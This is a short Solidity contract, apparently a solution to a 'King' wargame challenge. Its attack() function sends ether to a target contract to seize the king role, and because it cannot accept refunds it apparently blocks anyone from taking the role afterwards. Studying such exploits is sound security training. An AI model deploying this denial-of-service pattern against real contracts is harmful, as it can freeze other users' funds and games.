// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract KingAttacker {
    error KingAttacker__TransferFailed();

    address private king;

    constructor(address _king) {
        king = _king;
    }

    function attack() external payable {
        (bool success,) = payable(king).call{value: msg.value}("");
        if (!success) {
            revert KingAttacker__TransferFailed();
        }
    }
}
